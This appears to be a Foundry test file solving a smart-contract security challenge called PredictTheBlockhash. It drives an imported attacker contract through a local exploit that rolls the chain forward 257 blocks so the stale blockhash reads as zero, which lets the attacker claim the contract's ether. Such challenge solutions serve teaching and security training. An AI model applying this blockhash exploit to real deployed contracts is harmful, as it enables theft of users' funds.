// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../../src/security-1/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    Attacker public attackerContract;
    address public player;
    uint256 public settlementBlockNumber;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        attackerContract = new Attacker(predictTheBlockhash);
    }

    function testExploit() public {
        /** CODE YOUR SOLUTION HERE */

        player = vm.addr(1); // Set the player address
        vm.deal(player, 2 ether); // Give the player 2 ether

        vm.startPrank(player); // Start the prank as the player
        attackerContract.attack{value: 1 ether}(); // Call the attack function
        settlementBlockNumber = block.number + 1; // Set the settlement block number
        vm.stopPrank(); // Stop the prank

        // Simlate pass 257 blocks
        uint256 blocksToWait = 257;

        uint256 targetBlock = settlementBlockNumber + blocksToWait;

        vm.roll(targetBlock); // Roll the block number forward

        vm.startPrank(player);
        attackerContract.settle(); // Call the settle function
        vm.stopPrank(); // Stop the prank

        _checkSolved();
    }

    function _checkSolved() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}